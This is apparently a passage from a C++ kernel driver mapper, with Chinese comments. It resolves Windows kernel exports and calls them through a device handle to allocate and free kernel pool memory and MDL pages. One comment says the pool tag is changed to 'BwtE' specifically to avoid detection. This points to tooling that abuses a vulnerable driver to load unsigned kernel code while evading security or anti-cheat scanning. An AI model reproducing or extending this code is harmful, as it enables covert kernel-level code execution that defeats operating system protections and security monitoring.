        static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, ntoskrnlAddr, "MmFreePagesFromMdl");
        if (!kernel_MmFreePagesFromMdl)
        {
            std::cout << "[!] Failed to find MmFreePagesFromMdl" << std::endl;
            return;
        }

        CallKernelFunction<void>(device_handle, nullptr, kernel_MmFreePagesFromMdl, mdl);
    }

    // 分配池内存
    uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
    {
        if (!size)
            return 0;

        static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, ntoskrnlAddr, "ExAllocatePoolWithTag");

        if (!kernel_ExAllocatePool) {
            std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
            return 0;
        }

        uint64_t allocated_pool = 0;

        if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) // 修改池标签以避免检测
            return 0;

        return allocated_pool;
    }

    // 释放池内存
    bool FreePool(HANDLE device_handle, uint64_t address)
    {
        if (!address)
            return false;

        static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, ntoskrnlAddr, "ExFreePool");

        if (!kernel_ExFreePool) {
            std::cout << "[!] Failed to find ExFreePool" << std::endl;
            return false;
        }

        return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
    }
}